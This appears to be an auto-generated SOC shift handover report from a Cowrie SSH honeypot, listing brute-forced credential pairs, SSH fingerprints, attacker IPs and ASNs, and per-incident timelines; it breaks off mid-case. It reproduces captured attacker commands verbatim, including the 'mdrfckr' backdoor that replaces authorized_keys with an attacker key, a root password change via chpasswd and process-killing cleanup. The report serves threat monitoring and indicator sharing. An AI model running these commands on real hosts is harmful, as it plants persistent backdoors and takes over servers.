# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-04-25 |
| **Generated At** | 2026-04-25T05:51:20Z |
| **Shift Time** | 05:51 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · AWS EC2 · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **144** |
| Confirmed Threats | **137** |
| False Positives Filtered | **7** (4.9%) |
| Unique Attacker IPs | **26** |
| Countries of Origin | **10** |
| High Severity Cases | **27** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **117** |
| Malware Samples Analyzed | **0** HIGH · **16** MED · 2 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **69** |
| Unique Credential Pairs | **43** |
| Unique Usernames | **26** |
| Unique Passwords | **41** |
| Successful Auth Pairs | **20** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 27 |
| `345gs5662d34` | 13 |
| `ubuntu` | 4 |
| `test` | 2 |
| `test1` | 2 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `345gs5662d34` | 13 |
| `3245gs5662d34` | 13 |
| `123456` | 3 |
| `fai` | 2 |
| `12345678` | 2 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `345gs5662d34` | `345gs5662d34` | 13 |
| `root` | `3245gs5662d34` | 13 |
| `root` | `fai` | 2 |
| `test1` | `12345678` | 2 |
| `root` | `Admin2025@` | 1 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `root` | `Admin2025@` | `148.66.132.204` | 2026-04-25T02:46:13 |
| `root` | `3245gs5662d34` | `148.66.132.204` | 2026-04-25T02:46:15 |
| `root` | `T@cl0ud123` | `148.66.132.204` | 2026-04-25T02:48:15 |
| `root` | `prueba` | `101.29.255.113` | 2026-04-25T02:49:38 |
| `root` | `nPSpP4PBW0` | `101.29.255.113` | 2026-04-25T02:54:34 |
| `root` | `3245gs5662d34` | `101.29.255.113` | 2026-04-25T02:54:38 |
| `root` | `meow` | `94.159.101.249` | 2026-04-25T03:19:39 |
| `root` | `3245gs5662d34` | `94.159.101.249` | 2026-04-25T03:19:43 |
| `root` | `fai` | `14.248.83.33` | 2026-04-25T04:00:29 |
| `root` | `3245gs5662d34` | `14.248.83.33` | 2026-04-25T04:00:32 |
| `root` | `P@ssw0rd123$` | `160.251.101.169` | 2026-04-25T04:17:16 |
| `root` | `3245gs5662d34` | `160.251.101.169` | 2026-04-25T04:17:20 |
| `root` | `Password2025` | `111.228.58.144` | 2026-04-25T04:18:59 |
| `root` | `3245gs5662d34` | `111.228.58.144` | 2026-04-25T04:19:14 |
| `root` | `xxxxxxxx` | `160.251.101.169` | 2026-04-25T04:20:11 |
| `root` | `fai` | `160.251.101.169` | 2026-04-25T04:25:12 |
| `root` | `Qq123456789@` | `160.251.101.169` | 2026-04-25T04:27:15 |
| `root` | `qwerasdf` | `160.251.101.169` | 2026-04-25T04:28:15 |
| `root` | `qwerty12345678` | `160.251.101.169` | 2026-04-25T04:29:16 |
| `root` | `as123456.` | `160.251.101.169` | 2026-04-25T04:33:23 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **144** |
| Sessions with Fingerprint | **6** |
| Unique HASSH Fingerprints | **6** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| libssh | 102 |
| Go SSH scanner | 13 |
| Unknown | 1 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `af8223ac9914...` | libssh-based | 59 | 7 |
| `03a80b21afa8...` | Modern SSH client | 38 | 5 |
| `0a07365cc01f...` | Generic scanner | 12 | 1 |
| `dd9bcf093c35...` | Mirai/variant | 1 | 1 |
| `e54ef3ec27fe...` | Generic scanner | 1 | 1 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `af8223ac9914...` | libssh | 59 | 7 | libssh-based |
| `03a80b21afa8...` | libssh | 38 | 5 | Modern SSH client |
| `0a07365cc01f...` | Go SSH scanner | 12 | 1 | Generic scanner |
| `95420f9d932d...` | libssh | 5 | 2 | — |
| `dd9bcf093c35...` | Unknown | 1 | 1 | Mirai/variant |
| `e54ef3ec27fe...` | Go SSH scanner | 1 | 1 | Generic scanner |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **2** |
| Campaign Clusters | **2** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 1 | 1 | `T1021.004, T1078, T1083, T1082` |
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 13 | 6 | `T1021.004, T1078, T1070, T1140` |

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
```
cat /proc/cpuinfo | grep name | wc -l
```
```
echo "root:0vYc8ke1LiBo"|chpasswd|bash
```
```
rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;
```
Source IPs: `101.29.255.113`

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `94.159.101.249`, `101.29.255.113`, `160.251.101.169`, `14.248.83.33`, `111.228.58.144`, `148.66.132.204`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **26** |
| Unique ASNs | **20** |
| High-Risk ASNs | **16** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS4811` | China Telecom (Group) | 3 | HIGH |
| `AS396982` | Google LLC | 2 | LOW |
| `AS8075` | Microsoft Corporation | 2 | HIGH |
| `AS141679` | China Telecom Beijing Tianjin Hebei Big Data Industry Park Branch | 2 | HIGH |
| `AS63949` | Akamai Connected Cloud | 2 | LOW |
| `AS37963` | Hangzhou Alibaba Advertising Co.,Ltd. | 1 | HIGH |
| `AS9541` | Cyber Internet Services (Pvt) Ltd. | 1 | HIGH |
| `AS59257` | CMPak Limited | 1 | HIGH |

---

---

## 🚨 Priority Cases — Immediate Attention (27)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-2b3c1ef78b4e

| Field | Detail |
|---|---|
| **Source IP** | `148.66.132[.]204` |
| **First Seen** | 2026-04-25 02:46 |
| **Last Seen** | 2026-04-25 02:46 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-25 02:46:12` | `cowrie.session.connect` |
| `2026-04-25 02:46:12` | `cowrie.client.version` |
| `2026-04-25 02:46:13` | `cowrie.client.kex` |
| `2026-04-25 02:46:13` | `cowrie.login.success` |
| `2026-04-25 02:46:13` | `cowrie.session.params` |
| `2026-04-25 02:46:13` | `cowrie.command.input` |
| `2026-04-25 02:46:13` | `cowrie.command.failed` |
| `2026-04-25 02:46:13` | `cowrie.log.closed` |
| `2026-04-25 02:46:13` | `cowrie.session.params` |
| `2026-04-25 02:46:13` | `cowrie.command.input` |
| `2026-04-25 02:46:13` | `cowrie.session.file_download` |
| `2026-04-25 02:46:13` | `cowrie.log.closed` |
| `2026-04-25 02:46:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `148.66.132[.]204` to AbuseIPDB if not already reported
- [ ] Block `148.66.132[.]204` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-daae0ed56496

| Field | Detail |
|---|---|
| **Source IP** | `148.66.132[.]204` |
| **First Seen** | 2026-04-25 02:46 |
| **Last Seen** | 2026-04-25 02:46 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-25 02:46:15` | `cowrie.session.connect` |
| `2026-04-25 02:46:15` | `cowrie.client.version` |
| `2026-04-25 02:46:15` | `cowrie.client.kex` |
| `2026-04-25 02:46:15` | `cowrie.login.success` |
| `2026-04-25 02:46:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `148.66.132[.]204` to AbuseIPDB if not already reported
- [ ] Block `148.66.132[.]204` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-df53ba7cdf46

| Field | Detail |
|---|---|
| **Source IP** | `148.66.132[.]204` |
| **First Seen** | 2026-04-25 02:48 |
| **Last Seen** | 2026-04-25 02:48 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-25 02:48:15` | `cowrie.session.connect` |
| `2026-04-25 02:48:15` | `cowrie.client.version` |
| `2026-04-25 02:48:15` | `cowrie.client.kex` |
| `2026-04-25 02:48:15` | `cowrie.login.success` |
| `2026-04-25 02:48:16` | `cowrie.session.params` |
| `2026-04-25 02:48:16` | `cowrie.command.input` |
| `2026-04-25 02:48:16` | `cowrie.command.failed` |
| `2026-04-25 02:48:16` | `cowrie.log.closed` |
| `2026-04-25 02:48:16` | `cowrie.session.params` |
| `2026-04-25 02:48:16` | `cowrie.command.input` |
| `2026-04-25 02:48:16` | `cowrie.session.file_download` |
| `2026-04-25 02:48:16` | `cowrie.log.closed` |
| `2026-04-25 02:48:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `148.66.132[.]204` to AbuseIPDB if not already reported
- [ ] Block `148.66.132[.]204` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-baa7a87e59ed

| Field | Detail |
|---|---|
| **Source IP** | `148.66.132[.]204` |
| **First Seen** | 2026-04-25 02:48 |
| **Last Seen** | 2026-04-25 02:48 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-25 02:48:18` | `cowrie.session.connect` |
| `2026-04-25 02:48:18` | `cowrie.client.version` |
| `2026-04-25 02:48:18` | `cowrie.client.kex` |
| `2026-04-25 02:48:18` | `cowrie.login.success` |
| `2026-04-25 02:48:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `148.66.132[.]204` to AbuseIPDB if not already reported
- [ ] Block `148.66.132[.]204` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7d6dc0f44abe

| Field | Detail |
|---|---|
| **Source IP** | `101.29.255[.]113` |
| **First Seen** | 2026-04-25 02:49 |
| **Last Seen** | 2026-04-25 02:49 |
| **Session Duration** | 21s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~, cat /proc/cpuinfo | grep name | wc -l, echo "root:0vYc8ke1LiBo"|chpasswd|bash, rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2, 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW), 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1053.003 · T1057 · T1059.004 · T1078 · T1083 · T1105 · T1489 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-25 02:49:37` | `cowrie.session.connect` |
| `2026-04-25 02:49:37` | `cowrie.client.version` |
| `2026-04-25 02:49:38` | `cowrie.client.kex` |
| `2026-04-25 02:49:38` | `cowrie.login.success` |
| `2026-04-25 02:49:38` | `cowrie.session.params` |
| `2026-04-25 02:49:38` | `cowrie.command.input` |
| `2026-04-25 02:49:38` | `cowrie.command.failed` |
| `2026-04-25 02:49:39` | `cowrie.log.closed` |
| `2026-04-25 02:49:39` | `cowrie.session.params` |
| `2026-04-25 02:49:39` | `cowrie.command.input` |
| `2026-04-25 02:49:39` | `cowrie.session.file_download` |
| `2026-04-25 02:49:39` | `cowrie.log.closed` |
| `2026-04-25 02:49:51` | `cowrie.session.params` |
| `2026-04-25 02:49:51` | `cowrie.command.input` |
| `2026-04-25 02:49:51` | `cowrie.log.closed` |
| `2026-04-25 02:49:52` | `cowrie.session.params` |
| `2026-04-25 02:49:52` | `cowrie.command.input` |
| `2026-04-25 02:49:52` | `cowrie.log.closed` |
| `2026-04-25 02:49:52` | `cowrie.session.params` |
| `2026-04-25 02:49:52` | `cowrie.command.input` |
| `2026-04-25 02:49:52` | `cowrie.session.file_download` |
| `2026-04-25 02:49:52` | `cowrie.log.closed` |
| `2026-04-25 02:49:53` | `cowrie.session.params` |
| `2026-04-25 02:49:53` | `cowrie.command.input` |
| `2026-04-25 02:49:53` | `cowrie.log.closed` |
| `2026-04-25 02:49:53` | `cowrie.session.params` |
| `2026-04-25 02:49:53` | `cowrie.command.input` |
| `2026-04-25 02:49:53` | `cowrie.log.closed` |
| `2026-04-25 02:49:54` | `cowrie.session.params` |
| `2026-04-25 02:49:54` | `cowrie.command.input` |
| `2026-04-25 02:49:54` | `cowrie.command.input` |
| `2026-04-25 02:49:54` | `cowrie.log.closed` |
| `2026-04-25 02:49:54` | `cowrie.session.params` |
| `2026-04-25 02:49:54` | `cowrie.command.input` |
| `2026-04-25 02:49:54` | `cowrie.log.closed` |
| `2026-04-25 02:49:55` | `cowrie.session.params` |
| `2026-04-25 02:49:55` | `cowrie.command.input` |
| `2026-04-25 02:49:55` | `cowrie.log.closed` |
| `2026-04-25 02:49:55` | `cowrie.session.params` |
| `2026-04-25 02:49:55` | `cowrie.command.input` |
| `2026-04-25 02:49:55` | `cowrie.log.closed` |
| `2026-04-25 02:49:56` | `cowrie.session.params` |
| `2026-04-25 02:49:56` | `cowrie.command.input` |
| `2026-04-25 02:49:56` | `cowrie.log.closed` |
| `2026-04-25 02:49:57` | `cowrie.session.params` |
| `2026-04-25 02:49:57` | `cowrie.command.input` |
| `2026-04-25 02:49:57` | `cowrie.log.closed` |
| `2026-04-25 02:49:57` | `cowrie.session.params` |
| `2026-04-25 02:49:57` | `cowrie.command.input` |
| `2026-04-25 02:49:57` | `cowrie.log.closed` |
| `2026-04-25 02:49:58` | `cowrie.session.params` |
| `2026-04-25 02:49:58` | `cowrie.command.input` |
| `2026-04-25 02:49:58` | `cowrie.log.closed` |
| `2026-04-25 02:49:58` | `cowrie.session.params` |
| `2026-04-25 02:49:58` | `cowrie.command.input` |
| `2026-04-25 02:49:58` | `cowrie.log.closed` |
| `2026-04-25 02:49:59` | `cowrie.session.params` |
| `2026-04-25 02:49:59` | `cowrie.command.input` |
| `2026-04-25 02:49:59` | `cowrie.log.closed` |
| `2026-04-25 02:49:59` | `cowrie.session.params` |
| `2026-04-25 02:49:59` | `cowrie.command.input` |
| `2026-04-25 02:49:59` | `cowrie.log.closed` |
| `2026-04-25 02:49:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.29.255[.]113` to AbuseIPDB if not already reported
- [ ] Block `101.29.255[.]113` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c43be8607f2b

| Field | Detail |
|---|---|
| **Source IP** | `101.29.255[.]113` |
| **First Seen** | 2026-04-25 02:54 |
| **Last Seen** | 2026-04-25 02:54 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-25 02:54:34` | `cowrie.session.connect` |
| `2026-04-25 02:54:34` | `cowrie.client.version` |
| `2026-04-25 02:54:34` | `cowrie.client.kex` |
| `2026-04-25 02:54:34` | `cowrie.login.success` |
| `2026-04-25 02:54:35` | `cowrie.session.params` |
| `2026-04-25 02:54:35` | `cowrie.command.input` |
| `2026-04-25 02:54:35` | `cowrie.command.failed` |
| `2026-04-25 02:54:35` | `cowrie.log.closed` |
| `2026-04-25 02:54:35` | `cowrie.session.params` |
| `2026-04-25 02:54:35` | `cowrie.command.input` |
| `2026-04-25 02:54:35` | `cowrie.session.file_download` |
| `2026-04-25 02:54:35` | `cowrie.log.closed` |
| `2026-04-25 02:54:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.29.255[.]113` to AbuseIPDB if not already reported
- [ ] Block `101.29.255[.]113` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8cc10109e558

| Field | Detail |
|---|---|
| **Source IP** | `101.29.255[.]113` |
| **First Seen** | 2026-04-25 02:54 |
| **Last Seen** | 2026-04-25 02:54 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-25 02:54:38` | `cowrie.session.connect` |
| `2026-04-25 02:54:38` | `cowrie.client.version` |
| `2026-04-25 02:54:38` | `cowrie.client.kex` |
| `2026-04-25 02:54:38` | `cowrie.login.success` |
| `2026-04-25 02:54:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.29.255[.]113` to AbuseIPDB if not already reported
- [ ] Block `101.29.255[.]113` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b4f25eecb42d

| Field | Detail |
|---|---|
| **Source IP** | `94.159.101[.]249` |
| **First Seen** | 2026-04-25 03:19 |
| **Last Seen** | 2026-04-25 03:19 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-25 03:19:38` | `cowrie.session.connect` |
| `2026-04-25 03:19:38` | `cowrie.client.version` |
| `2026-04-25 03:19:38` | `cowrie.client.kex` |
| `2026-04-25 03:19:39` | `cowrie.login.success` |
| `2026-04-25 03:19:39` | `cowrie.session.params` |
| `2026-04-25 03:19:39` | `cowrie.command.input` |
| `2026-04-25 03:19:39` | `cowrie.command.failed` |
| `2026-04-25 03:19:39` | `cowrie.log.closed` |
| `2026-04-25 03:19:40` | `cowrie.session.params` |
| `2026-04-25 03:19:40` | `cowrie.command.input` |
| `2026-04-25 03:19:40` | `cowrie.session.file_download` |
| `2026-04-25 03:19:40` | `cowrie.log.closed` |
| `2026-04-25 03:19:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `94.159.101[.]249` to AbuseIPDB if not already reported
- [ ] Block `94.159.101[.]249` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-29074651987c

| Field | Detail |
|---|---|
| **Source IP** | `94.159.101[.]249` |
| **First Seen** | 2026-04-25 03:19 |
| **Last Seen** | 2026-04-25 03:19 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-25 03:19:42` | `cowrie.session.connect` |
| `2026-04-25 03:19:42` | `cowrie.client.version` |
| `2026-04-25 03:19:42` | `cowrie.client.kex` |
| `2026-04-25 03:19:43` | `cowrie.login.success` |
| `2026-04-25 03:19:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `94.159.101[.]249` to AbuseIPDB if not already reported
- [ ] Block `94.159.101[.]249` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ef7f59c02433

| Field | Detail |
|---|---|
| **Source IP** | `14.248.83[.]33` |
| **First Seen** | 2026-04-25 04:00 |
| **Last Seen** | 2026-04-25 04:00 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
